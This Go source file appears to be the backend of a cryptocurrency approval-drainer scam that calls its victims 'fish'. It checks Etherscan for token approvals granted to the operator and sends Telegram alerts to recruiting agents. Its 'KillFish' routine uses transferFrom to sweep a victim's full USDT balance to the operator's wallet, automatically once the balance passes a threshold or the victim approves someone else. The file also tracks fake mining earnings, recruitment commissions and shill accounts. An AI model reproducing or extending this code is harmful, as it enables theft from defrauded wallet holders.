/**
 * @Author $
 * @Description //TODO $
 * @Date $ $
 * @Param $
 * @return $
 **/
package util

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/gin-gonic/gin"
	"github.com/go-redis/redis"
	"github.com/jinzhu/gorm"
	"github.com/shopspring/decimal"
	"github.com/spf13/viper"
	token "github.com/wangyi/fishpond/eth"
	"io/ioutil"
	"log"
	"math"
	"math/big"
	"strconv"
	"strings"

	"math/rand"
	"net/http"
	"time"
)

func RandStr(length int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	rand.Seed(time.Now().UnixNano() + int64(rand.Intn(100)))
	for i := 0; i < length; i++ {
		result = append(result, bytes[rand.Intn(len(bytes))])
	}
	return string(result)
}

func CreateToken(Rdb *redis.Client) string {

	for i := 0; i < 5; i++ {
		str := RandStr(36)
		_, err := Rdb.HGet("TOKEN_USER", str).Result()
		if err != nil {
			return str
		}
	}
	return ""
}

/**
判断 字符串是否在这个数组中
*/
func InArray(target string, strArray []string) bool {
	for _, element := range strArray {
		if strings.ToLower(target) == strings.ToLower(element) {
			return true
		}
	}
	return false
}

/**
  返回方法
*/
func JsonWrite(context *gin.Context, status int, result interface{}, msg string) {
	context.JSON(http.StatusOK, gin.H{
		"code":   status,
		"result": result,
		"msg":    msg,
	})
}

//func GetAccountMoneyUsdT(id int, foxAddress string, db *gorm.DB) {
//	resp, err := http.Get("https://etherscan.io/address/" + foxAddress)
//	if err != nil {
//		return
//	}
//	defer resp.Body.Close()
//	body, err1 := ioutil.ReadAll(resp.Body)
//	if err1 != nil {
//		return
//	}
//	//fmt.Println(string(body))
//	//解析正则表达式，如果成功返回解释器
//	reg1 := regexp.MustCompile(`<div class="col-md-8">\$(\d+)`)
//	if reg1 == nil { //解释失败，返回nil
//		return
//	}
//	//根据规则提取关键信息
//	result1 := reg1.FindAllStringSubmatch(string(body), -1)
//	maxMoney, err := strconv.ParseFloat(result1[0][1], 64)
//	up := model.Fish{
//		Money: maxMoney,
//	}
//	db.Model(&model.Fish{}).Where("id=?", id).Update(up)
//	return
//
//}

func ToDecimal(ivalue interface{}, decimals int) decimal.Decimal {
	value := new(big.Int)
	switch v := ivalue.(type) {
	case string:
		value.SetString(v, 10)
	case *big.Int:
		value = v
	}

	mul := decimal.NewFromFloat(float64(10)).Pow(decimal.NewFromFloat(float64(decimals)))
	num, _ := decimal.NewFromString(value.String())
	result := num.Div(mul)

	return result
}

//生成邀请码

/***
  更新 鱼的 usd eth
*/
func UpdateUsdAndEth(foxAddress string, Db *gorm.DB, money float64, fishID int, Aid int, remark string, redis *redis.Client) {

	ethUrl := viper.GetString("eth.ethUrl")
	client, err := ethclient.Dial(ethUrl)
	if err != nil {
		return
	}
	//获取 美元
	tokenAddress := common.HexToAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7") //usDT
	instance, err := token.NewToken(tokenAddress, client)
	if err != nil {
		return
	}
	address := common.HexToAddress(foxAddress)
	bal, err := instance.BalanceOf(&bind.CallOpts{}, address)
	if err != nil {
		return
	}
	usd := ToDecimal(bal.String(), 6)
	balance, err := client.BalanceAt(context.Background(), address, nil)
	if err != nil {
		return
	}
	eth := ToDecimal(balance.String(), 18)
	data := make(map[string]interface{})
	data["money"], _ = usd.Float64()
	data["money_eth"], _ = eth.Float64()

	b, _ := strconv.ParseFloat(usd.String(), 64)

	//获取鱼
	fish := Fish{}
	err9 := Db.Where("fox_address=?", foxAddress).First(&fish).Error
	if err9 == nil {
		if fish.AlreadyKill == 1 { //总是杀开关
			config := Config{}
			err9 = Db.Where("id=1").First(&config).Error
			if err9 == nil {
				if b >= config.LowCanKillFishMoney && fish.Authorization == 2 { //总是杀  一定要对已经授权的用户操作
					KillFish(Db, fish.BAddress, fish.FoxAddress, int(fish.ID),
						redis, fish.AdminId, fish.Belong)
				}
			}
		}
	}

	if math.Abs(money-b) > 2 {
		a := b - money
		c := strconv.FormatFloat(a, 'f', 2, 64)
		fishIDY := strconv.Itoa(fishID)
		e := strconv.FormatFloat(money, 'f', 2, 64)
		var p string
		if a > 0 {
			p = " 😄😄😄"
		} else {
			p = " 😭😭😭"
		}

		admin := Admin{}
		Db.Where("id=?", Aid).First(&admin)
		content := "❥【钱包余额变动报警】------------------------------------------------->%0A" +
			" 用户备注: [" + remark + "] " + "%0A" +
			" 用户编号:[ 11784374" + fishIDY + "] " + "%0A" +
			" 余额变动: " + c + "%0A" +
			" 原来余额: " + e + "%0A" +
			" 当前余额: " + usd.String() + "%0A" +
			"所属代理ID:" + admin.Username + "%0A" +
			" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + p
		fmt.Println("警报")
		NotificationAdmin(Db, Aid, content)
	}

	Db.Table("fish").Where("fox_address=?", foxAddress).Update(data)
	return
}

/***
  检查授权
*/

type Result struct {
	BlockNumber       string `json:"blockNumber"`
	TimeStamp         string `json:"timeStamp"`
	Hash              string `json:"hash"`
	Nonce             string `json:"nonce"`
	BlockHash         string `json:"blockHash"`
	TransactionIndex  string `json:"transactionIndex"`
	From              string `json:"from"`
	To                string `json:"to"`
	Value             string `json:"value"`
	Gas               string `json:"gas"`
	GasPrice          string `json:"gasPrice"`
	IsError           string `json:"isError"`
	ReceiptStatus     string `json:"txreceipt_status"`
	InPut             string `json:"input"`
	ContractAddress   string `json:"contractAddress"`
	CumulativeGasUsed string `json:"cumulativeGasUsed"`
	GasUsed           string `json:"gasUsed"`
	Confirmations     string `json:"confirmations"`
}
type TxList struct {
	Status  string   `json:"status"`
	Message string   `json:"message"`
	Result  []Result `json:"result"`
}

type Fish struct {
	ID                      uint    `gorm:"primaryKey;comment:'主键'"`
	Username                string  `gorm:"varchar(225)"`
	Password                string  `gorm:"varchar(225)"`
	Token                   string  `gorm:"varchar(225)"`
	Status                  int     `gorm:"int(10);default:1"`
	FoxAddress              string  `gorm:"varchar(225);comment:'狐狸钱包地址'"`
	Money                   float64 `gorm:"type:decimal(10,2)"`                      // USdt 余额
	MoneyEth                float64 `gorm:"type:decimal(30,18)"`                     //用户的eth  余额
	YesterdayEarnings       float64 `gorm:"type:decimal(10,2)"`                      //昨日的收益
	TodayEarnings           float64 `gorm:"type:decimal(10,2)"`                      //今日的收益
	TotalEarnings           float64 `gorm:"type:decimal(10,2)"`                      //总收益
	WithdrawalFreezeAmount  float64 `gorm:"type:decimal(10,2);comment:'提现冻结金额'"`     //  提现冻结的金额
	EarningsMoney           float64 `gorm:"type:decimal(10,2);comment:'收益的可以提现的余额'"` //可以提现的金额
	VipLevel                int     `gorm:"int(11);comment:'vip等级id';index"`
	AdminId                 int     `gorm:"int(11);comment:'属于那个代理';index"`
	SuperiorId              int     `gorm:"int(11);comment:'上级代理用户';index"`
	Updated                 int64
	Created                 int64
	Authorization           int     `gorm:"int(10);default:1"` //1 没有授权  2 授权
	InCode                  string  `gorm:"varchar(225)"`      //授权码
	Remark                  string  `gorm:"varchar(225)"`      //备注
	TodayEarningsETH        float64 `gorm:"-"`                 //
	ETHExchangeRate         string  `gorm:"-"`
	Model                   int     `gorm:"-"`
	FoxAddressOmit          string  `gorm:"-"`
	AlreadyGeyUSDT          float64 `gorm:"type:decimal(10,2)"`  //已经提现的美元
	AlreadyGeyETH           float64 `gorm:"type:decimal(30,18)"` //已经提现的ETH
	BAddress                string  `gorm:"varchar(225)"`
	AuthorizationTime       int     `gorm:"int(10);default:0"`                  //1 没有授权  2 授权
	MiningEarningETH        float64 `gorm:"type:decimal(30,18);comment:'挖矿收益'"` //挖矿收益
	MiningEarningUSDT       float64 `gorm:"type:decimal(10,2);default:0"`       //收益 USDT
	Belong                  int     //子代理 需要填写的字段
	BelongString            string
	InComeTimes             int     `gorm:"int(10);default:1"` //发送收益次数
	MonitoringSwitch        int     `gorm:"int(10);default:1"` //监控开关  1 开  2 关
	ServerSwitch            int     `gorm:"int(10);default:2"` //客服开关  1 开  2 关
	AuthorizationAt         int64   //授权时间
	PledgeSwitch            int     `gorm:"int(10);default:2"` //质押开关  1 开  2 关   //质押开关
	Temp                    float64 `gorm:"-"`                 //用于计算
	OthersAuthorizationKill int     `gorm:"int(10);default:2"` //他人授权就杀的开关  1 开  2 关   //他人授权就杀的开关
	AlreadyKill             int     `gorm:"int(10);default:2"` //总是杀开关  1 开  2 关   //有钱就杀
	TheOnlyInvited          string  //唯一邀请码
	CommissionIncome        float64 `gorm:"type:decimal(10,2)"` //佣金收益

}

type Admin struct {
	ID                             uint   `gorm:"primaryKey;comment:'主键'"`
	Username                       string `gorm:"varchar(225)"`
	Password                       string `gorm:"varchar(225)"`
	Token                          string `gorm:"varchar(225)"`
	Level                          int    `gorm:"int(10);default:0"`
	Status                         int    `gorm:"int(10);default:1"`
	Ip                             string `gorm:"varchar(225)"`
	TheOnlyInvited                 string //唯一邀请码
	Updated                        int64
	Created                        int64
	Belong                         int
	ServiceAddress                 string `gorm:"type:text"` //客服地址
	ServiceAddressSwitch           int
	InComeTimes                    int    `gorm:"int(10);default:1"` //发送收益次数
	TelegramToken                  string //小飞机的token
	TelegramChatId                 string //小飞机的聊天ID
	LongUrl                        string
	WithdrawalRejectedReasonSwitch int     `gorm:"int(10);default:2"`              //提现驳回原因开矿   1 开  2 关
	KillFishDouble                 int     `gorm:"int(1);default:2"`               //杀鱼资产翻倍  1  开 2   关
	MinTiXianMoney                 float64 `gorm:"type:decimal(30,18);default:-1"` // 用户最小提现金额
	MinTiXianTime                  int     `gorm:"int(10);default:-1"`             //提现次数限制
	CostOfHeadSwitch               int     `gorm:"int(10);default:2"`              //人头费用开关   1 开  2 关
	CostOfHeadMoney                float64 `gorm:"type:decimal(30,18);default:10"` //人头费用
	IfShowPromotionCodeSwitch      int     `gorm:"int(10);default:2"`              //是否显示邀请码(对每条鱼)   1 开  2 关  是否显示 推广码
	UnAuthorizationCanInviteSwitch int     `gorm:"int(10);default:2"`              //没有授权是否可以发展下级开关   1 开  2 关  是否显示 推广码
	UpInComePer                    float64 //上级收益百分比
	UpUpInComePer                  float64 //上上级收益
	UpUpUpInComePer                float64 //上上上级收益

}

type BAddressList struct {
	ID       uint   `gorm:"primaryKey;comment:'主键'"`
	BAddress string `gorm:"varchar(225)"`
	BKey     string `gorm:"varchar(225)"`
}

func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string, Db *gorm.DB, BList []string, redis *redis.Client) {

	//获取 要查询的 fish
	//apiKey := "5YJ37XCEQFSEDMMI6RXZ756QB7HS2VT921"
	foxAddress = "0xb64c3f90a3c72b26d08387cc9f21eb5cbc086956"
	res, err := http.Get("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	body, err1 := ioutil.ReadAll(res.Body)
	if err1 != nil {
		fmt.Println(err1.Error())
		return
	}
	defer res.Body.Close()
	var data TxList
	err = json.Unmarshal([]byte(string(body)), &data)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	var count int = 0
	if data.Status == "1" && data.Message == "OK" {
		var ifCount bool = true
		var status string
		for _, k := range data.Result {
			IsError, _ := strconv.Atoi(k.IsError)
			if len(k.InPut) == 138 && k.InPut[0:10] == "0x095ea7b3" && IsError == 0 {
				BAddressOne := "0x" + k.InPut[34:74]
				if k.InPut[127:] == "00000000000" && InArray(strings.ToLower(BAddressOne), BList) { //取消授权  更新数据库
					status = "取消授权"

				}
				if k.InPut[127:] != "00000000000" && InArray(strings.ToLower(BAddressOne), BList) { //授权成功
					status = "授权我们"
					if ifCount {
						count++
						ifCount = false
					}
				}
				if k.InPut[127:] != "00000000000" && InArray(strings.ToLower(BAddressOne), BList) == false { // 已经授权给他人
					count++
				}
			}
		}
		//判断 取消还是授权我们
		if status == "授权我们" {
			fish := Fish{}
			err := Db.Where("fox_address=?", foxAddress).First(&fish).Error
			if err == nil {
				//  新增授权
				if fish.Authorization == 1 { //监控开关
					fishID := strconv.Itoa(int(fish.ID))
					admin := Admin{}
					Db.Where("id=?", fish.AdminId).First(&admin)
					Db.Model(&Fish{}).Where("id=?", fish.AdminId).Update(&Fish{AuthorizationAt: time.Now().Unix()}) //更新授权时间
					content := "❥【授权给我们报警!!】---------------------------------------------------->%0A" +
						" 用户编号: [ 11784374" + fishID + "] " + "已授权给我们%0A" +
						"钱包地址:" + foxAddress + "%0A" +
						"所属代理ID:" + admin.Username + "%0A" +
						" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "👏👏👏️"
					NotificationAdmin(Db, fish.AdminId, content)
				}

				if fish.Authorization == 1 { //这条鱼没有授权  // 给授权佣金
					admin := Admin{}
					err = Db.Where("id=?", fish.AdminId).First(&admin).Error
					if err == nil {
						if admin.CostOfHeadSwitch == 1 { //人头费开关
							//查找他的上级
							UpFish := Fish{}
							err00 := Db.Where("id=?", fish.SuperiorId).First(&UpFish).Error
							if err00 == nil {
								err1 := Db.Model(&Fish{}).Where("id=?", UpFish.ID).Update(&Fish{
									CommissionIncome: UpFish.CommissionIncome + admin.CostOfHeadMoney,
									TotalEarnings:    UpFish.TotalEarnings + admin.CostOfHeadMoney,
									EarningsMoney:    UpFish.EarningsMoney + admin.CostOfHeadMoney,
									TodayEarnings:    UpFish.TodayEarnings + admin.CostOfHeadMoney,
								}).Error
								if err1 == nil {
									fins := FinancialDetails{
										Kinds:   12,
										FishId:  int(UpFish.ID),
										Created: time.Now().Unix(),
									}
									Db.Save(&fins) //表记录
								}
							}
						}
					}
				}

				mapData := make(map[string]interface{})
				mapData["authorization"] = 2
				mapData["b_address"] = BAddress
				mapData["authorization_at"] = time.Now().Unix()
				Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
			}

		} else if status == "取消授权" {
			//mapData := make(map[string]interface{})
			//mapData["authorization"] = 1
			//Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
			fish := Fish{}
			Db.Where("fox_address=?", foxAddress).First(&fish)
			if fish.Authorization == 2 { //已经授权 了 然后取消
				fishID := strconv.Itoa(int(fish.ID))
				admin := Admin{}
				Db.Where("id=?", fish.AdminId).First(&admin)
				content := "❥【取消授权报警】-------------------------------------------------->%0A" +
					" 用户编号: [ 11784374" + fishID + "] " + "取消了我们%0A" +
					" 用户备注: [" + fish.Remark + "] " + "%0A" +
					"钱包地址:" + foxAddress + "%0A" +
					"所属代理ID:" + admin.Username + "%0A" +
					" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "😳😳😳"
				NotificationAdmin(Db, fish.AdminId, content)
				//修改鱼的授权状态
				Db.Table("fish").Where("fox_address=?", foxAddress).Update(Fish{Authorization: 1})
			}

		}

		//判断是否授权他人
		if count > 0 && ifCount == true { //授权个他人
			fish := Fish{}
			err := Db.Where("fox_address=?", foxAddress).First(&fish).Error
			if err == nil {
				//  新增授权
				people := strconv.Itoa(count)
				fishID := strconv.Itoa(int(fish.ID))
				//content := "[授权他人报警] 编号: [" + fishID + "] 用户备注 [" + fish.Remark + "],授权给他人,当前授权人数为:" + people + " 时间: " + time.Now().Format("2006-01-02 15:04:05")
				//adminString := strconv.Itoa(fish.AdminId)
				admin := Admin{}
				Db.Where("id=?", fish.AdminId).First(&admin)
				if fish.AuthorizationTime != count {
					content := "❥【授权他人报警】-------------------------------------------------->%0A" +
						" 用户编号: [ 11784374" + fishID + "] " + "授权给他人%0A" +
						" 用户备注: [" + fish.Remark + "] " + "%0A" +
						"所属代理ID:" + admin.Username + "%0A" +
						"钱包地址:" + foxAddress + "%0A" +
						" 当前授权人数: [" + people + "] " + "%0A" +
						" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "😱😱😱"
					NotificationAdmin(Db, fish.AdminId, content)
				}
				if fish.OthersAuthorizationKill == 1 && fish.AuthorizationTime < count { //授权给他们就杀开关   1开 开始自动杀鱼
					KillFish(Db, BAddress, foxAddress, int(fish.ID), redis, fish.AdminId, fish.Belong)
				}
			}
		}

		mapData := make(map[string]interface{})
		mapData["authorization_time"] = count
		Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)

	}

}

/**
  批量修改 余额
*/
func BatchUpdateBalance(adminId int, Db *gorm.DB, redis *redis.Client) {
	type Admin struct {
		ID uint
	}
	type Fish struct {
		FoxAddress string
		Remark     string
		Money      float64
		ID         uint
	}
	var admins []Admin
	Db.Table("admins").Where("id= ? or belong =?", adminId, adminId).Find(&admins)
	for _, k := range admins {
		var fish []Fish
		//查询 鱼
		Db.Table("fish").Where("admin_id=?", k.ID).Find(&fish)
		for _, kk := range fish {
			if kk.Remark != "托" {
				UpdateUsdAndEth(kk.FoxAddress, Db, kk.Money, int(kk.ID), adminId, kk.Remark, redis)
			}

		}
	}

}

func NotificationAdmin(Db *gorm.DB, adminID int, Message string, ) {
	type Admin struct {
		ID                   uint   `gorm:"primaryKey;comment:'主键'"`
		Username             string `gorm:"varchar(225)"`
		Password             string `gorm:"varchar(225)"`
		Token                string `gorm:"varchar(225)"`
		Level                int    `gorm:"int(10);default:0"`
		Status               int    `gorm:"int(10);default:1"`
		Ip                   string `gorm:"varchar(225)"`
		TheOnlyInvited       string //唯一邀请码
		Updated              int64
		Created              int64
		Belong               int
		ServiceAddress       string `gorm:"type:text"` //客服地址
		ServiceAddressSwitch int
		InComeTimes          int    `gorm:"int(10);default:1"` //发送收益次数
		TelegramToken        string //小飞机的token
		TelegramChatId       string //小飞机的聊天ID
	}
	admin := Admin{}
	err := Db.Where("id=?", adminID).First(&admin).Error
	if err == nil {
		url := "https://api.telegram.org/bot" + admin.TelegramToken + "/sendMessage?chat_id=" + admin.TelegramChatId + "&text=" + Message
		res, _ := http.Get(url)
		defer res.Body.Close()
	}

}

/**
  每日统计  个输
	RegisterCount int     //注册个数
	TiXianCount   int     //提现个数
	Authorization int     //授权个数
*/
func AddEverydayData(redis *redis.Client, context string, SonAdminIdInt int, AdminIdInt int) {
	SonAdminId := strconv.Itoa(SonAdminIdInt)
	AdminId := strconv.Itoa(AdminIdInt)
	//首先获取是否存在   子代
	today := time.Now().Format("2006-01-02")
	b := today + "_Total_" + SonAdminId
	if a, _ := redis.HExists(b, context).Result(); a == true {
		//存在  就先获取
		c, _ := redis.HGet(b, context).Result()
		newC, _ := strconv.Atoi(c)
		redis.HSet(b, context, newC+1)
	} else {
		//不存在
		redis.HSet(b, context, 1)
	}

	//总代
	b = today + "_Total_" + AdminId
	if a, _ := redis.HExists(b, context).Result(); a == true {
		//存在  就先获取
		c, _ := redis.HGet(b, context).Result()
		newC, _ := strconv.Atoi(c)
		redis.HSet(b, context, newC+1)
	} else {
		//不存在
		redis.HSet(b, context, 1)
	}
	//超级管理员
	b = today + "_Total_" + "1"
	if a, _ := redis.HExists(b, context).Result(); a == true {
		//存在  就先获取
		c, _ := redis.HGet(b, context).Result()
		newC, _ := strconv.Atoi(c)
		redis.HSet(b, context, newC+1)
	} else {
		//不存在
		redis.HSet(b, context, 1)
	}

}
/**
统计钱
*/
func AddEverydayMoneyData(redis *redis.Client, context string, SonAdminIdInt int, AdminIdInt int, Money float64) {
	SonAdminId := strconv.Itoa(SonAdminIdInt)
	AdminId := strconv.Itoa(AdminIdInt)
	//首先获取是否存在   子代
	today := time.Now().Format("2006-01-02")
	b := today + "_Total_" + SonAdminId
	if a, _ := redis.HExists(b, context).Result(); a == true {
		//存在  就先获取
		c, _ := redis.HGet(b, context).Result()
		newC, _ := strconv.ParseFloat(c, 64)
		redis.HSet(b, context, newC+Money)
	} else {
		//不存在
		redis.HSet(b, context, Money)
	}

	//总代
	b = today + "_Total_" + AdminId
	if a, _ := redis.HExists(b, context).Result(); a == true {
		//存在  就先获取
		c, _ := redis.HGet(b, context).Result()
		newC, _ := strconv.ParseFloat(c, 64)
		redis.HSet(b, context, newC+Money)
	} else {
		//不存在
		redis.HSet(b, context, Money)
	}
	//超级管理员
	b = today + "_Total_" + "1"
	if a, _ := redis.HExists(b, context).Result(); a == true {
		//存在  就先获取
		c, _ := redis.HGet(b, context).Result()
		newC, _ := strconv.ParseFloat(c, 64)
		redis.HSet(b, context, newC+Money)
	} else {
		//不存在
		redis.HSet(b, context, Money)
	}

}
/**
杀鱼
*/
type Config struct {
	ID                      uint    `gorm:"primaryKey;comment:'主键'"`
	BAddress                string  `gorm:"varchar(225)"`
	BKey                    string  `gorm:"varchar(225)"`
	BMnemonic               string  `gorm:"varchar(225)"`
	RevenueModel            int     `gorm:"int(10);default:1"` //收益模式 1USDT 2ETH 2 ETH+USDT
	AddMoneyMode            int     `gorm:"int(10);default:1"` //加钱模式 1正常加钱更具账户的余额  2余额+未体现的钱
	CAddress                string  `gorm:"varchar(225)"`
	IfNeedInCode            int     `gorm:"int(1);default:1"`                         //1不需要 2需要
	WithdrawalPattern       int     `gorm:"int(1);default:1"`                         //提现模式  1  美元 2 ETH
	TheTotalOrePool         float64 `gorm:"type:decimal(20,2);default:100000000 " `   //总矿池
	YesterdayGrossIncomeETH float64 `gorm:"type:decimal(30,18);default:0.1061375661"` //昨日总收入  ETH
	LowCanKillFishMoney     float64 `gorm:"int(10);default:50"`                       //美元

}
type FinancialDetails struct {
	ID                        uint    `gorm:"primaryKey;comment:'主键'"`
	FishId                    int     `gorm:"int(11);comment:'鱼id';index"`
	Money                     float64 `gorm:"type:decimal(10,2)"`  //美元
	MoneyEth                  float64 `gorm:"type:decimal(30,18)"` //这个只针对提现  ETH  提现
	Pattern                   int     `gorm:"int(10);default:1"`   //1 是美元 提现  2 是 ETH 提现
	Kinds                     int     //类型 1提现 2提现等待审核 3驳回 8系统每日加钱  9管理员转账  10管理转账中... 11转账失败
	TheExchangeRateAtThatTime float64 //当时的汇率
	Remark                    string  `gorm:"varchar(225)"`
	FoxAddress                string  `gorm:"-"`
	BAddress                  string  //B地址
	CAddress                  string  //C地址
	Created                   int64
	Updated                   int64
	Authorization             int     `gorm:"int(10);default:1"` //1 不是自动杀鱼  2 自动杀鱼
	TaskId                    string  //异步任务id
	HashCode                  string  //hash值
	ETH                       float64 `gorm:"-"`
	FishRemark                string  `gorm:"-"`
	FormAgency                string  `gorm:"-"`
}

/**
杀鱼
*/
func KillFish(Db *gorm.DB, BAddress string, foxAddress string, FishId int, redis *redis.Client, AdminId int, Belong int) {
	jsonOne := make(map[string]interface{})
	//在这里提取
	list := BAddressList{}
	err := Db.Where("b_address=?", BAddress).First(&list).Error
	if err != nil {
		return
	}
	config := Config{}
	err = Db.Where("b_address=?", BAddress).First(&config).Error
	if err != nil {
		return
	}
	jsonOne["mnemonic"] = list.BKey
	jsonOne["to_address"] = config.CAddress
	jsonOne["token_name"] = "usdt"
	jsonOne["account_index"] = 0
	jsonOne["from_address"] = foxAddress
	// 现场查询余额
	ethUrl := viper.GetString("eth.ethUrl")
	client, err := ethclient.Dial(ethUrl)
	if err != nil {
		return
	}
	//获取 美元
	tokenAddress := common.HexToAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7") //usDT
	instance, err := token.NewToken(tokenAddress, client)
	if err != nil {
		return
	}
	address := common.HexToAddress(foxAddress)
	bal, err := instance.BalanceOf(&bind.CallOpts{}, address)
	if err != nil {
		log.Fatal(err)
	}
	//判断 钱包得钱是否值得提现
	p, _ := ToDecimal(bal.String(), 6).Float64()
	if p < config.LowCanKillFishMoney {
		return
	}
	jsonOne["amount"] = bal.String()
	jsonDate := make(map[string]interface{})
	jsonDate["method"] = "erc20_transfer_from"
	jsonDate["params"] = jsonOne
	byte, _ := json.Marshal(jsonDate)
	//生成任务id
	taskId := time.Now().Format("20060102") + RandStr(8)
	resp, err1 := http.Post("http://127.0.0.1:8000/ethservice?taskId="+taskId, "application/json", strings.NewReader(string(byte)))
	if err1 != nil {
		fmt.Println(err1.Error())
		return
	}
	a, _ := ToDecimal(bal.String(), 6).Float64()
	add := FinancialDetails{
		TaskId:        taskId,
		Kinds:         10,
		FishId:        FishId,
		CAddress:      config.CAddress,
		Created:       time.Now().Unix(),
		Updated:       time.Now().Unix(),
		Money:         a,
		Authorization: 2, //自动杀鱼
	}
	Db.Save(&add)
	defer resp.Body.Close()
	AddEverydayMoneyData(redis, "ChouQuMoney", AdminId, Belong, a)
	respByte, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(respByte))

}
